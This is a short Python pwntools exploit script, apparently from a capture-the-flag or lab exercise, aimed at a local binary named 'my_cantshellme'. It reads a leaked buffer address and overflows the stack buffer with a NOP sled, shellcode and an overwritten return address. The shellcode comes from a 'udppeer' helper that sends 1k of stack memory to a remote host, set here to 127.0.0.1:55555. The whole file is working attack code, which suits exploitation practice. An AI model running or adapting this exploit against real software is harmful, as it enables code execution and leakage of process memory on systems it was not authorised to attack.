#!/usr/bin/env python3
from pwn import *

context(arch = 'amd64', os='linux')

p = process('./my_cantshellme')

bufflen = 168

##################################################################
# New shellcraft functionality:
# 
#   shellcraft.updpeer() - Sends 1k of the stack to a remote host
#
##################################################################
shellcode = shellcraft.udppeer('127.0.0.1',55555)
##################################################################

shellcode = asm(shellcode)


print(len(shellcode))

sclen = len(shellcode)

p.recvuntil(b': ')
buff_addr_str = p.recvlines(1)
buff_addr = int(buff_addr_str[0],16)
payload = (b'\x90' * 8) + shellcode + (b'\x90' *(bufflen - (sclen + 8)))  + p64(buff_addr) 

p.send(payload)
p.interactive()

